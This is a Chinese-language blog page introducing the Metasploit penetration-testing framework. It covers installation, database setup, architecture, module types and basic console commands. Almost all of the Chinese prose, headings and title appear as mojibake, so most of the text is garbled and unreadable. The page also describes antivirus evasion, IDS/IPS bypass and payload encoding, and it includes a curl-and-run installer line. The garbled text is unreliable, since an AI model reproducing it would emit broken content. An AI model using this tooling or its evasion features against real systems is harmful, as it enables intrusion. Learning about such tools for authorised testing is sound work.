<!DOCTYPE html>
<html lang="zh-CN">

  
<head>
  <meta charset="utf-8">
  <meta name="author" content="johnscott" />
  
  
  
  <title>12Metasploitç°¡ä»‹ | JohnScott2046çš„åšå®¢</title>

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
    <meta name="keywords" content="ç½‘ç»œå®‰å…¨,Metasploit," />
  

  <script>
    console.log('\n%c Hexo-theme-bmw v4.0 ' + '%c ğŸ‰ https://github.com/dongyuanxin/theme-bmw ğŸ‰\n' + '\n%c View demo online ' + '%c ğŸ” https://godbmw.com/ ğŸ”  \n' , 'color: #fadfa3; background: #030307; padding:3px 0;', '', 'color: #fadfa3; background: #030307; padding:3px 0;', '');
  </script>

  
    <meta name="description" content="è¶…çº§å¸½å­æˆæ³•çš„ä¸ªäººåšå®¢,ä¸»è¦è®°å½•å¤åˆ¶ç²˜è´´è¿‡æ¥çš„ç¬”è®°,è¿˜æœ‰è‡ªå·±çš„ä¸€äº›å¿ƒå¾—ä½“ä¼š">
  

  

  
    <link rel="icon" href="/images/favicon.ico">
    <link rel="apple-touch-icon" href="/images/touch-icon.png">
  

  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/base.css">
<link rel="stylesheet" href="/icon/iconfont.css">
<link rel="stylesheet" href="/css/github-markdown.css">
<link rel="stylesheet" href="/css/highlight.css">


  
<script src="/js/util.js"></script>
<script src="/js/valine.min.js"></script>


  

  
    <link href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css" rel="stylesheet">
    <script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js" async></script>
  

  
    <link href="https://cdn.bootcss.com/social-share.js/1.0.16/css/share.min.css" rel="stylesheet">
  
  
  <script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js" async></script>
  
  
    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.0/dist/av-min.js"></script>
  

<meta name="generator" content="Hexo 5.1.1"></head>

  <body>
    <meta name="baidu-site-verification" content="code-GGEum2Y5d8" />
    

    <div id="app">

      <div class="header-wrap">
  <header>
    <div class="site-brand">
      <div class="site-title">
        <a href="/">JohnScott2046</a>
      </div>
    </div>
    <nav class="site-navigation">
      <ul class="nav-menu">
      
        <li class="nav-item" data-path="/">
          
            <a 
              href="/"
              target="_self"
            >
              ä¸»é¡µ
            </a>
          
        </li>
      
        <li class="nav-item" data-path="/archives/">
          
            <a 
              href="/archives/"
              target="_self"
            >
              å½’æ¡£
            </a>
          
        </li>
      
        <li class="nav-item" data-path="/categories/">
          
            <a 
              href="/categories/"
              target="_self"
            >
              åˆ†ç±»
            </a>
          
        </li>
      
        <li class="nav-item" data-path="/tags/">
          
            <a 
              href="/tags/"
              target="_self"
            >
              æ ‡ç­¾
            </a>
          
        </li>
      
        <li class="nav-item" data-path="/friends/">
          
            <a 
              href="/friends/"
              target="_self"
            >
              å‹é“¾
            </a>
          
        </li>
      
        <li class="nav-item" data-path="/about/">
          
            <a 
              href="/about/"
              target="_self"
            >
              å…³äº
            </a>
          
        </li>
      
        <li class="nav-item" data-path="">
          
            <a href="javascript:void(0);" v-else>è”ç³»æˆ‘</a>
            <ul class="nav-menu--dropdown">
              
                <li>
                  <a 
                    href="https://github.com/liuxue5213" 
                    target="_blank"
                  >
                    Github
                  </a>
                </li>
              
                <li>
                  <a 
                    href="https://www.zhihu.com/people/liuxue5213" 
                    target="_blank"
                  >
                    çŸ¥ä¹
                  </a>
                </li>
              
                <li>
                  <a 
                    href="http://weibo.com/liuxue5213" 
                    target="_blank"
                  >
                    å¾®åš
                  </a>
                </li>
              
                <li>
                  <a 
                    href="https://www.douban.com/people/liuxue5213" 
                    target="_blank"
                  >
                    è±†ç“£
                  </a>
                </li>
              
                <li>
                  <a 
                    href="/linkedin.com/in/liuxue5213" 
                    target="_blank"
                  >
                    linkedin
                  </a>
                </li>
              
            </ul>
          
        </li>
      
      </ul>
    </nav>
    <i class="iconfont icon-menu"></i>
  </header>
</div>

<script>
  let links = document.querySelectorAll('.nav-item');
  for(let link of links){
    let childrenLink = link.querySelector('ul');
    link.addEventListener('mouseenter', () => {
      if(childrenLink) {
        childrenLink.className = "nav-menu--dropdown active";
      }
    })
    link.addEventListener('mouseleave', () => {
      if(childrenLink) {
        childrenLink.className = "nav-menu--dropdown";
      }
    })
  }
  let rootRealPath = getRealPath(window.location.pathname, true);
  for(let link of links) {
    let linkPath = link.getAttribute("data-path");
    if(linkPath && getRealPath(linkPath, true) === rootRealPath) {
      link.className = "nav-item hover";
    }
  }

  let iconMenu = document.querySelector("i.iconfont.icon-menu"),
    iconMenuClicked = false;
  let navDOM = document.querySelector("nav.site-navigation");
  iconMenu.addEventListener("click", () => {
    iconMenuClicked 
      ? navDOM.className = "site-navigation active"
      : navDOM.className = "site-navigation";
    iconMenuClicked = !iconMenuClicked;
  })
</script>

      








<div class="container post-index">

  

<div class="post">
  <h1 class="article-title">
    <span>12Metasploitç°¡ä»‹</span>
  </h1>
  <div class="article-top-meta">
    <span>
      å‘å¸ƒ : 
      2021-05-12
    </span>
    
      <span>
        åˆ†ç±» : 
          <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
            ç½‘ç»œå®‰å…¨
          </a>
      </span>
    
    
      <span>
        æµè§ˆ : <span class="article-timer" data-identity="12Metasploit"></span>
      </span>
    
  </div>

  

  <div class="article-content">
    <div class="markdown-body">
      <h2 id="linuxå®‰è£"><a href="#linuxå®‰è£" class="headerlink" title="linuxå®‰è£"></a>linuxå®‰è£</h2><p>curl <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb">https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb</a> &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall</p>
<p>apt install postgresql<br>systemctl start postgresql<br>systemctl enable postgresql </p>
<p>useradd -m postgresql<br>passwd postgresql</p>
<p>su postgresql<br>msfdb init</p>
<p>msfconsole<br>db_status</p>
<p>å‡ºç¾ä»¥ä¸‹å…§å®¹ï¼Œå³ç‚ºå®‰è£æˆåŠŸ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; db_status</span><br><span class="line">[*] Connected to msf. Connection type: postgresql.</span><br></pre></td></tr></table></figure>

<p>åƒç…§æ–‡ç«  <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/601a3cb65e11">Debian10 å®‰è£… Metasploit Framework æŒ‡å—</a></p>
<h2 id="ä¸€ã€-Metasploitç°¡ä»‹"><a href="#ä¸€ã€-Metasploitç°¡ä»‹" class="headerlink" title="ä¸€ã€ Metasploitç°¡ä»‹"></a>ä¸€ã€ Metasploitç°¡ä»‹</h2><h3 id="1ã€-Metasploit-æ¡†æ¶"><a href="#1ã€-Metasploit-æ¡†æ¶" class="headerlink" title="1ã€ Metasploit æ¡†æ¶"></a>1ã€ Metasploit æ¡†æ¶</h3><p>æ¸—é€æµ‹è¯•è€…çš„å›°æ‰°ï¼šåœ¨ä¼—å¤šç›¸åŒç±»å‹çš„å·¥å…·ï¼Œä¸çŸ¥é“å¦‚ä½•é€‰æ‹©ã€‚é¢å°æ•°ç™¾ä¸ªå·¥å…·è½¯ä»¶ï¼Œä¸Šåƒä¸ªå‘½ä»¤å‚æ•°ï¼Œå¾ˆé›£éƒ½è¨˜ä½ä½¿ç”¨æ–¹æ³•ã€‚æ–°å‡ºç°çš„æ¼æ´ POC/EXP æœ‰ä¸åŒçš„è¿è¡Œç¯å¢ƒè¦æ±‚ï¼Œå‡†å¤‡å·¥ä½œç¹çã€‚å¤§éƒ¨åˆ†æ—¶é—´éƒ½åœ¨å­¦ä¹ ä¸åŒå·¥å…·çš„ä½¿ç”¨ï¼ŒMetasploitå°±æ˜¯å¾ˆå¤šå€‹å·¥å…·ä½¿ç”¨çš„ç»Ÿä¸€</p>
<p>POCï¼Œå…¨ç§°â€Proof of Conceptâ€ï¼Œä¸­æ–‡â€œæ¦‚å¿µéªŒè¯â€ï¼Œå¸¸ç”¨æ–¼ä¸€æ®µæ¼æ´è¯æ˜çš„ä»£ç <br>EXPï¼Œå…¨ç§°â€Exploitâ€ï¼Œä¸­æ–‡â€œåˆ©ç”¨â€ï¼ŒæŒ‡åˆ©ç”¨ç³»ç»Ÿæ¼æ´é€²è¡Œæ”»å‡»çš„å‹•ä½œ</p>
<p>Metasploit æ¡†æ¶æ˜¯å¯ä»¥æ·»åŠ æ¼æ´ä»£ç ç‰‡æ®µï¼Œå°±å¥½æ¯”ä¸€ä¸ªå†›ç«åº“ï¼Œå®ƒé‡Œé¢æœ‰å„ç§æ­¦å™¨ï¼Œå½“ç„¶ä¹Ÿæœ‰æ–°çš„æ­¦å™¨è¢«ç ”å‘å‡ºæ¥ï¼Œæ”¾åˆ°æ­¦å™¨åº“é‡Œé¢åï¼Œéš¨æ™‚å¯ä»¥ä½¿ç”¨ï¼Œè¿™å°±æ˜¯æ¡†æ¶çš„å¥½å¤„ï¼Œæ–°çš„æ”»å‡»ä»£ç å¯ä»¥æ¯”è¾ƒå®¹æ˜“çš„åŠ å…¥ MSF æ¡†æ¶ä¾›å¤§å®¶ä½¿ç”¨</p>
<h3 id="2ã€-Metasploit-ç®€ä»‹"><a href="#2ã€-Metasploit-ç®€ä»‹" class="headerlink" title="2ã€ Metasploit ç®€ä»‹"></a>2ã€ Metasploit ç®€ä»‹</h3><p>å®˜ç¶² <a target="_blank" rel="noopener" href="https://www.metasploit.com/">metasploit</a></p>
<p>Metasploit æ˜¯ä¸€æ¬¾å¼€æºã€å…è´¹ã€å¯ä¸‹è½½çš„æ¡†æ¶ï¼Œé€šè¿‡å®ƒå¯ä»¥å¾ˆå®¹æ˜“åœ°è·å–ã€å¼€å‘å¯¹è®¡ç®—æœºè½¯ä»¶æ¼æ´å®æ–½æ”»å‡»ã€‚å®ƒæœ¬èº«é™„å¸¦æ•°ç™¾ä¸ªå·²çŸ¥è½¯ä»¶æ¼æ´çš„å°ˆæ¥­çº§æ¼æ´æ”»å‡»å·¥å…·ã€‚H.D. Moore åœ¨ 2003 å¹´å‘å¸ƒMetasploit æ—¶ï¼Œè®¡ç®—æœºå®‰å…¨çŠ¶å†´ä¹Ÿè¢«æ°¸ä¹…æ€§åœ°æ”¹å˜äº†ã€‚ä»¿ä½›ä¸€å¤œä¹‹é—´ï¼Œä»»ä½•äººéƒ½å¯ä»¥æˆä¸ºé»‘å®¢ï¼Œæ¯ä¸ªäººéƒ½å¯ä»¥ä½¿ç”¨æ”»å‡»å·¥å…·æ¥æ”»å‡»é‚£äº›æœªæ‰“è¿‡è¡¥ä¸æˆ–è€…åˆšåˆšæ‰“è¿‡è¡¥ä¸çš„æ¼æ´ã€‚è½¯ä»¶å‚å•†å†ä¹Ÿä¸èƒ½æ¨è¿å‘å¸ƒé’ˆå¯¹å·²å…¬å¸ƒæ¼æ´çš„è¡¥ä¸äº†ï¼Œè¿™æ˜¯å› ä¸º Metasploit å›¢é˜Ÿä¸€ç›´éƒ½åœ¨è‡´åŠ›å¼€å‘å„ç§æ”»å‡»å·¥å…·ï¼Œå¹µå°†å®ƒä»¬è´¡çŒ®ç»™æ‰€æœ‰ Metasploit ç”¨æˆ·</p>
<p>MSF ç›®å‰æ˜¯æœ€æµè¡Œï¼Œæœ€å¼ºå¤§ï¼Œæœ€å…·æ‰©å±•æ€§çš„æ¸—é€æµ‹è¯•å¹³å°è½¯ä»¶ï¼Œ2003 å¹´æ™‚ H.D.Moore å‘å¸ƒç¬¬ä¸€ç‰ˆï¼Œ2007 å¹´ç”¨ ruby èªè¨€é‡å†™ã€‚shodan é»‘æš—æœç´¢å¼•æ“ H.D.Moore ä¹Ÿåƒèˆ‡äº†å¼€å‘</p>
<p>Metasploit ç›®å‰æ˜¯å…¨çƒæœ€å¸¸è§çš„æ¸—é€æµ‹è¯•æ¡†æ¶ï¼Œä½å±… secTools æ’è¡Œæ¦œç¬¬ 2 ä½ã€‚å¯ä»¥å¹«åŠ©å®‰å…¨å’Œ IT å°ˆæ¥­äººå£«è¯†åˆ«å®‰å…¨æ€§é—®é¢˜ï¼ŒéªŒè¯æ¼æ´çš„ç¼“è§£æªæ–½ï¼Œå¹µç®¡ç†å°ˆå®¶é©…å‹•çš„å®‰å…¨æ€§é€²è¡Œè¯„ä¼°ï¼Œæä¾›çœŸæ­£çš„å®‰å…¨é£é™©æƒ…æŠ¥ã€‚è¿™äº›åŠŸèƒ½åŒ…æ‹¬æ™ºèƒ½å¼€å‘ï¼Œä»£ç å®¡è®¡ï¼ŒWeb åº”ç”¨ç¨‹åºæ‰«æï¼Œç¤¾ä¼šå·¥ç¨‹ç­‰</p>
<h3 id="3ã€-Metasploit-ç‰ˆæœ¬"><a href="#3ã€-Metasploit-ç‰ˆæœ¬" class="headerlink" title="3ã€ Metasploit ç‰ˆæœ¬"></a>3ã€ Metasploit ç‰ˆæœ¬</h3><p>ç¤¾åŒºç‰ˆï¼šé›†æˆåœ¨ kali ç³»ç»Ÿä¸­ï¼Œç›®å‰åŸºäºç¤¾åŒºåŠ›é‡ç»´æŠ¤ã€‚æ—©æœŸç‰ˆæœ¬éœ€è¦å…ˆå•Ÿå‹•æ•°æ®åº“å†å•Ÿå‹• MSFï¼Œç°åœ¨å·²ç»é›†æˆåˆ° msf é‡Œé¢äº†</p>
<p>Pro ç‰ˆï¼šä¼ä¸šç‰ˆçš„å‡ ä¸ªä¼˜åŠ¿</p>
<ol>
<li>ä¼ä¸šç‰ˆå‡ºçš„æ£€æµ‹æŠ¥å‘Šéå¸¸å¼ºå¤§ï¼Œç»™å®¢æˆ·æ±‡æŠ¥èµ·æ¥å¾ˆæ–¹ä¾¿ã€‚</li>
<li>AV å…æ€ï¼Œç¤¾åŒºç‰ˆçš„å…æ€å¤§å®¶éƒ½çŸ¥é“ï¼Œä¼ä¸šçº§çš„å…æ€æ“šèªªå¯ä»¥è¾¾åˆ°ç™¾åˆ†ä¹‹ä¹åç”šè‡³ç™¾åˆ†ä¹‹ç™¾ã€‚</li>
<li>IDS/IPS ç»•è¿‡ï¼ˆå…¥ä¾µæ£€æµ‹ç³»ç»Ÿ/å…¥ä¾µé˜²å¾¡ç³»ç»Ÿï¼‰</li>
<li>VPN Pivoting</li>
</ol>
<h2 id="äºŒã€-Metasploit-æ¶æ„ä»‹ç»"><a href="#äºŒã€-Metasploit-æ¶æ„ä»‹ç»" class="headerlink" title="äºŒã€ Metasploit æ¶æ„ä»‹ç»"></a>äºŒã€ Metasploit æ¶æ„ä»‹ç»</h2><ol>
<li>REXï¼šåŸºç¡€åŠŸèƒ½åº“ï¼Œç”¨äºå®Œæˆæ—¥å¸¸åŸºæœ¬ä»»åŠ¡ï¼Œæ— éœ€äººå·¥æ‰‹åŠ¢ç¼–ç å®ç°ï¼Œå¤„ç† socket è¿æ¥è®¿é—®ï¼Œåè®®åº”ç­”(http/SSL/SMB ç­‰)ï¼Œç¼–ç è½¬æ¢ï¼ˆXOR,Base64,Unicodeï¼‰</li>
<li>æŠ€æœ¯æ¨¡å—ï¼š5.0 ä¹‹åå°±å¢åŠ äº†ä¸ª evasion æ¨¡å—ï¼Œç°åœ¨ä¸€å…±æ˜¯ 7 ä¸ªæŠ€æœ¯æ¨¡å—</li>
<li>æ’ä»¶ï¼šæ’ä»¶å¯ä»¥è°ƒç”¨å¤–éƒ¨ä¸€äº›æ¸—é€æµ‹è¯•å·¥å…·ï¼Œä¾‹å¦‚ï¼šload nessus å°±å¯ä»¥è°ƒç”¨ nessus æ‰«æè½¯ä»¶</li>
<li>æ¥å£ï¼šæœ‰ msfconsole æ§åˆ¶ç»ˆç«¯ã€msfcli å‘½ä»¤è¡Œã€msfgui å›¾å½¢åŒ–ç•Œé¢ã€armitage å›¾å½¢åŒ–ç•Œé¢å’Œmsfapi è¿›ç¨‹è°ƒç”¨æ¥å£</li>
<li>åŠŸèƒ½ç¨‹åºï¼šmetasploit è¿˜å¼€å‘äº†ä¸€äº›å¯ä»¥ç›´æ¥è¿è¡Œçš„å‘½ä»¤ï¼Œæ¯”å¦‚ msfpayloadã€msfencode ä»¥åŠ msfvenom</li>
</ol>
<p>1ã€åŸºç¡€åº“ï¼šmetasploit åŸºç¡€åº“æ–‡ä»¶ä½äºæºç æ ¹ç›®å½•è·¯å¾„ä¸‹çš„ libraries ç›®å½•ä¸­ï¼ŒåŒ…æ‹¬ Rex,framework-core å’Œ framework-base ä¸‰éƒ¨åˆ†ã€‚ Rex æ˜¯æ•´ä¸ªæ¡†æ¶æ‰€ä¾èµ–çš„æœ€åŸºç¡€çš„ä¸€äº›ç»„ä»¶ï¼Œ å¦‚åŒ…è£…çš„ç½‘ç»œå¥—æ¥å­—ã€ç½‘ç»œåº”ç”¨åè®®å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯å® ç°ã€æ—¥å¿—å­ç³»ç»Ÿã€æ¸—é€æ”»å‡»æ”¯æŒä¾‹ç¨‹ã€PostgreSQL ä»¥åŠ MySQL æ•°æ®åº“æ”¯æŒç­‰ï¼›framework-core åº“è´Ÿè´£å®ç°æ‰€æœ‰ä¸å„ç§ç±»å‹çš„ä¸Šå±‚æ¨¡å—åŠæ’ä»¶çš„äº¤äº’æ¥ å£ï¼› framework-base åº“æ‰©å±•äº† framework-coreï¼Œæä¾›æ›´åŠ ç®€å•çš„åŒ…è£…ä¾‹ç¨‹ï¼Œå¹¶ä¸ºå¤„ç†æ¡†æ¶å„ä¸ªæ–¹ é¢ çš„åŠŸèƒ½æä¾›äº†ä¸€äº›åŠŸèƒ½ç±»ï¼Œç”¨äºæ”¯æŒç”¨æˆ·æ¥å£ä¸åŠŸèƒ½ç¨‹åºè°ƒç”¨æ¡†æ¶æœ¬èº«åŠŸèƒ½åŠæ¡†æ¶é›†æˆæ¨¡å—</p>
<p>2ã€æ¨¡å—ï¼šæ¨¡å—ç»„ç»‡æŒ‰ç…§ä¸åŒçš„ç”¨é€”åˆ†ä¸º 6 ç§ç±»å‹çš„æ¨¡å—ï¼ˆModulesï¼‰ï¼š åˆ†ä¸ºè¾…åŠ©æ¨¡å—ï¼ˆAux)ã€æ¸—é€æ”» å‡»æ¨¡å—ï¼ˆExploits)ã€åæ¸—é€æ”»å‡»æ¨¡å—ï¼ˆPost)ã€æ”»å‡»è½½è·æ¨¡å— ï¼ˆpayloads)ã€ç¼–ç å™¨æ¨¡å—ï¼ˆEncoders)ã€ ç©ºæŒ‡ä»¤æ¨¡å—ï¼ˆNops)ã€‚ æ³¨ï¼špayload åˆç§°ä¸ºæ”»å‡»è½½è·ï¼Œä¸»è¦æ˜¯ç”¨æ¥å»ºç«‹ç›®æ ‡æœºä¸æ”»å‡»æœºç¨³å®šè¿æ¥çš„ï¼Œå¯ä»¥è¿”å› shellï¼Œä¹Ÿå¯ä»¥ è¿›è¡Œç¨‹åºæ³¨å…¥ç­‰</p>
<p>3ã€æ’ä»¶ï¼šæ’ä»¶èƒ½å¤Ÿæ‰©å……æ¡†æ¶çš„åŠŸèƒ½ï¼Œæˆ–è€…ç»„è£…å·²æœ‰åŠŸèƒ½æ„æˆé«˜çº§ç‰¹æ€§çš„ç»„ä»¶ã€‚æ’ä»¶å¯ä»¥é›†æˆç°æœ‰çš„ ä¸€äº›å¤–éƒ¨å®‰å…¨å·¥å…·ï¼Œå¦‚ Nessusã€OpenVAS æ¼æ´æ‰«æå™¨ç­‰ï¼Œä¸ºç”¨æˆ·æ¥å£æä¾›ä¸€äº›æ–°çš„åŠŸèƒ½ã€‚ </p>
<p>4ã€æ¥å£ï¼šåŒ…æ‹¬ msfconsole æ§åˆ¶ç»ˆç«¯ã€msfcli å‘½ä»¤è¡Œã€msfgui å›¾å½¢åŒ–ç•Œé¢ã€armitage å›¾å½¢åŒ–ç•Œ é¢ ä»¥åŠ msfapi è¿œç¨‹è°ƒç”¨æ¥å£ã€‚ </p>
<p>5ã€åŠŸèƒ½ç¨‹åºï¼š metasploit è¿˜æä¾›äº†ä¸€ç³»åˆ—å¯ç›´æ¥è¿è¡Œçš„åŠŸèƒ½ç¨‹åºï¼Œæ”¯æŒæ¸—é€æµ‹è¯•è€…ä¸å®‰å…¨äººå‘˜å¿« é€Ÿåœ° åˆ©ç”¨ metasploit æ¡†æ¶å†…éƒ¨èƒ½åŠ›å®Œæˆä¸€äº›ç‰¹å®šä»»åŠ¡ã€‚æ¯”å¦‚ msfpayloadã€msfencode å’Œ msfvenom å¯ ä»¥å°†æ”»å‡»è½½è·å°è£…ä¸ºå¯æ‰§è¡Œæ–‡ä»¶ã€C è¯­è¨€ã€JavaScript è¯­è¨€ç­‰å¤šç§å½¢å¼ï¼Œå¹¶å¯ä»¥è¿›è¡Œå„ç§</p>
<h2 id="ä¸‰ã€-Metasploit-æŠ€æœ¯åŠŸèƒ½æ¨¡å—"><a href="#ä¸‰ã€-Metasploit-æŠ€æœ¯åŠŸèƒ½æ¨¡å—" class="headerlink" title="ä¸‰ã€ Metasploit æŠ€æœ¯åŠŸèƒ½æ¨¡å—"></a>ä¸‰ã€ Metasploit æŠ€æœ¯åŠŸèƒ½æ¨¡å—</h2><h3 id="1-MSF-æŠ€æœ¯åŠŸèƒ½-æ¨¡å—åˆ†ç±»"><a href="#1-MSF-æŠ€æœ¯åŠŸèƒ½-æ¨¡å—åˆ†ç±»" class="headerlink" title="1. MSF æŠ€æœ¯åŠŸèƒ½ æ¨¡å—åˆ†ç±»"></a>1. MSF æŠ€æœ¯åŠŸèƒ½ æ¨¡å—åˆ†ç±»</h3><p>ä½æ–¼ /usr/share/metasploit-framework/modules ç›®éŒ„ä¸‹</p>
<p>auxiliary  encoders  evasion  exploits  nops  payloads  post</p>
<h3 id="2-æŠ€æœ¯æ¨¡å—-çš„åŠŸèƒ½"><a href="#2-æŠ€æœ¯æ¨¡å—-çš„åŠŸèƒ½" class="headerlink" title="2. æŠ€æœ¯æ¨¡å— çš„åŠŸèƒ½"></a>2. æŠ€æœ¯æ¨¡å— çš„åŠŸèƒ½</h3><p>æŠ€æœ¯åŠŸèƒ½æ¨¡å—ï¼š æœ‰æ–°æ¼æ´å¯ä»¥åˆ©ç”¨çš„æ¨¡å—ï¼Œè¦æ”¾åˆ°è¿™äº›æ¨¡å—ä¸‹é¢é€²è¡Œè°ƒç”¨</p>
<ol>
<li>Auxiliary</li>
</ol>
<p>è´Ÿè´£æ‰§è¡Œä¿¡æ¯æ”¶é›†ã€æ‰«æã€å—…æ¢ã€æŒ‡ç´‹è¯†åˆ«ã€å£ä»¤çŒœæµ‹å’Œ Dos æ”»å‡»ç­‰åŠŸèƒ½çš„è¼”åŠ©æ¨¡å—</p>
<ol start="2">
<li>Exploits</li>
</ol>
<p>åˆ©ç”¨ç³»ç»Ÿæ¼æ´é€²è¡Œæ”»å‡»çš„å‹•ä½œï¼Œæ­¤æ¨¡å—å¯¹åº”æ¯ä¸€ä¸ªå…·ä½“æ¼æ´çš„æ”»å‡»æ–¹æ³•ï¼ˆä¸»å‹•ã€è¢«å‹•ï¼‰</p>
<ol start="3">
<li>Payloads<br>æˆåŠŸ exploit ä¹‹åï¼ŒçœŸæ­£åœ¨ç›®æ ‡ç³»ç»Ÿæ‰§è¡Œçš„ä»£ç æŒ‡ä»¤</li>
</ol>
<p>åˆ†ä¸º 3 ç§ç±»å‹çš„ payloadï¼Œåˆ†åˆ«æ˜¯ singleã€stages å’Œ stagersã€‚</p>
<p>shellcode æ˜¯ç‰¹æ®Šçš„ payloadï¼Œç”¨äºæ‹¿ shell</p>
<p>singleï¼šall-in-oneã€‚å®Œæ•´çš„ payloadï¼Œè¿™äº› payload éƒ½æ˜¯ä¸€ä½“åŒ–çš„ï¼Œä¸éœ€è¦ä¾èµ–å¤–éƒ¨çš„åº“å’ŒåŒ…</p>
<p>stagersï¼šç›®æ ‡è®¡ç®—æœºå†…å­˜æœ‰é™æ—¶ï¼Œå…ˆä¼ è¾“ä¸€ä¸ªè¾ƒå°çš„ payload ç”¨äºå»ºç«‹é€£æ¥</p>
<p>stagesï¼šåˆ©ç”¨ stagers å»ºç«‹çš„é€£æ¥ä¸‹è½½åç»­ payload</p>
<ol start="4">
<li>Encoders</li>
</ol>
<p>å¯¹ payload é€²è¡ŒåŠ å¯†ï¼Œèº²é¿ AntiVirus æ£€æŸ¥çš„æ¨¡å—</p>
<ol start="5">
<li>Nops</li>
</ol>
<p>æé«˜ payload ç¨³å®šæ€§åŠç»´æŒå¤§å°ã€‚åœ¨æ¸—é€æ”»å‡»æ„é€ æ¶æ„æ•°æ®ç¼“å†²åŒºæ—¶ï¼Œå¸¸å¸¸è¦åœ¨çœŸæ­£è¦æ‰§è¡Œçš„ Shellcode ä¹‹å‰æ·»åŠ ä¸€æ®µç©ºæŒ‡ä»¤åŒºï¼Œ è¿™æ ·å½“è§¦å‘æ¸—é€æ”»å‡»åè·³è½¬æ‰§è¡Œ ShellCode æ—¶ï¼Œæœ‰ä¸€ä¸ªè¾ƒå¤§çš„å®‰å…¨ç€é™†åŒºï¼Œä»è€Œé¿å…å—åˆ°å†…å­˜ åœ°å€éšæœºåŒ–ã€è¿”å›åœ°å€è®¡ç®—åå·®ç­‰åŸå› é€ æˆçš„ ShellCode æ‰§è¡Œå¤±è´¥ï¼Œæé«˜æ¸—é€æ”»å‡»çš„å¯é æ€§</p>
<ol start="6">
<li>Post</li>
</ol>
<p>åæœŸæ¸—é€æ¨¡å—ã€‚åœ¨å–å¾—ç›®æ ‡ç³»ç»Ÿè¿›ç¨‹æ§åˆ¶æƒåï¼Œé€²è¡Œä¸€ç³»åˆ—çš„åæ¸—é€æ”»å‡»æ“ä½œï¼Œå¦‚è·å–æ•æ„Ÿä¿¡æ¯ã€è·³æ¿æ”»å‡»ç­‰æ“ä½œ</p>
<ol start="7">
<li>Evasion</li>
</ol>
<p>åˆ›å»ºæœ¨é©¬æ–‡ä»¶ï¼Œä¸ªäººæ„Ÿè§‰ç›¸å½“äº msfvenom çš„ä¸€ä¸ªå­åŠŸèƒ½çš„å­˜åœ¨</p>
<h2 id="å››ã€-Metasploit-åŸºæœ¬ä½¿ç”¨å’Œæ§åˆ¶å°å‘½ä»¤"><a href="#å››ã€-Metasploit-åŸºæœ¬ä½¿ç”¨å’Œæ§åˆ¶å°å‘½ä»¤" class="headerlink" title="å››ã€ Metasploit åŸºæœ¬ä½¿ç”¨å’Œæ§åˆ¶å°å‘½ä»¤"></a>å››ã€ Metasploit åŸºæœ¬ä½¿ç”¨å’Œæ§åˆ¶å°å‘½ä»¤</h2><h3 id="1ã€-å•Ÿå‹•-MSF"><a href="#1ã€-å•Ÿå‹•-MSF" class="headerlink" title="1ã€ å•Ÿå‹• MSF"></a>1ã€ å•Ÿå‹• MSF</h3><p>å•Ÿå‹• Metasploit æ¡†æ¶éœ€è¦è¿è¡Œ Postgresql æ•°æ®åº“ï¼Œç°åœ¨åªè¦è¿è¡Œ Metasploit æ—¶éƒ½ä¼šè‡ªå‹•å•Ÿå‹• Postgresql æ•°æ®åº“ã€‚å¦‚æœæ•°æ®åº“æ²¡é‹è¡Œçš„è¯ï¼Œå¯ä»¥æ‰‹å‹•å•Ÿå‹•ï¼Œä¸‹é¢æ™‚ç®¡ç†æ•°æ®åº“çš„ä¸€äº›å‘½ä»¤</p>
<p>netstat -pantu | grep 5432</p>
<p>lsof -i :5432</p>
<p>æ‰‹å‹•é–‹å•Ÿæ•°æ®åº“</p>
<p>systemctl start postgresql #å•Ÿå‹•æ•°æ®åº“<br>systemctl enable postgresql #è®¾ç½®æˆå¼€æœºå•Ÿå‹•</p>
<p>msfdb init #å•Ÿå‹•ä¸¦åˆå§‹åŒ–æ•°æ®åº“<br>msfdb reinit #åˆªé™¤ä¸¦é‡æ–°åˆå§‹åŒ–æ•°æ®åº“<br>msfdb delete #åˆªé™¤æ•°æ®åº“ä¸¦åœæ­¢ä½¿ç”¨å®ƒ<br>msfdb start #å•Ÿå‹•æ•°æ®åº“<br>msfdb stop #åœæ­¢æ•°æ®åº“<br>msfdb status #æ£€æŸ¥æœåŠ¡çŠ¶æ€<br>msfdb run #å•Ÿå‹•æ•°æ®åº“ä¸¦è¿è¡Œ msfconsole</p>
<h3 id="2ã€-Msfconsole-æ¥å£å•Ÿå‹•å‘½ä»¤"><a href="#2ã€-Msfconsole-æ¥å£å•Ÿå‹•å‘½ä»¤" class="headerlink" title="2ã€ Msfconsole æ¥å£å•Ÿå‹•å‘½ä»¤"></a>2ã€ Msfconsole æ¥å£å•Ÿå‹•å‘½ä»¤</h3><p>å‡ ä¹å¯ä»¥ä½¿ç”¨å…¨éƒ¨ MSF åŠŸèƒ½ï¼Œæ§åˆ¶å°å‘½ä»¤æ”¯æŒ TABè‡ªå‹•è¡¥å…¨ï¼Œæ”¯æŒå¤–éƒ¨å‘½ä»¤çš„æ‰§è¡Œ(ç³»ç»Ÿå‘½ä»¤ls pwdç­‰)</p>
<p>msfconsole -q / -v å‚æ•°<br>    -q å®‰é™é–‹å•Ÿ<br>    -v ç‰ˆæœ¬ä¿¡æ¯</p>
